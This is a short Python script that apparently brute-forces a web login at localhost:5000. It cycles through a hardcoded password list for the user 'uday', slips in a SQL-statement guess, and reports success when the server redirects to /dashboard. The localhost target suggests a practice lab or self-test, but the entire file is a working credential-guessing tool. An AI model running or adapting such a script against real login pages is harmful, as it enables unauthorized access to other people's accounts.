import requests

url = "http://localhost:5000/login"   # use localhost (important)
username = "uday"

passwords = [
    "ranjan",
   
    "456",
    "SELECT * FROM users;",
    
    "12347",
    "1234",""
    "12345",
    "9693"
    ,"Uday@1234"
]

for pwd in passwords:
    data = {
        "username": username.strip(),
        "password": pwd.strip()
    }

    try:
        r = requests.post(
            url,
            data=data,
            allow_redirects=False,
            timeout=5,
            proxies={"http": None, "https": None}  # disable proxy
        )

        print(f"[*] Tried {pwd} -> Status: {r.status_code}, Location: {r.headers.get('Location')}")

        if r.status_code == 302 and r.headers.get("Location") == "/dashboard":
            print(f"[+] FOUND PASSWORD: {pwd}")
            break
        else:
            print(f"[-] Failed: {pwd}")

    except Exception as e:
        print(f"[!] ERROR for {pwd}: {e}")